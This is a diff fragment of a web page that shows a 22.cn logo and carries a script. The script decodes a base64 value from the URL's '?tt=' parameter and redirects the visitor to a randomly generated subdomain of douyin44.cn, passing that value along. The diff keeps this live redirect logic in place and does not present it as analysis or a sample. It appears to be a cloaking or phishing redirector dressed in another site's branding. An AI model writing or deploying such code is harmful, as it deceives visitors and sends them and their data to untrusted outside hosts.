@@ -5,9 +5,11 @@
 <img src="http://www.22.cn/Content/images/logo.png"></img>
 
 <script>
- var i=window.location.search.substring(3);
-var i=window.atob(i);
+
  if(window.location.search.indexOf("?tt=")!=-1){
+   var i=window.location.search.substring(3);
+var i=window.atob(i);
+  
  var sj=Math.random().toString(36).substr(2);
 var url="http://"+sj+".douyin44.cn/w/t/?i=" +i;
 location.href=url;
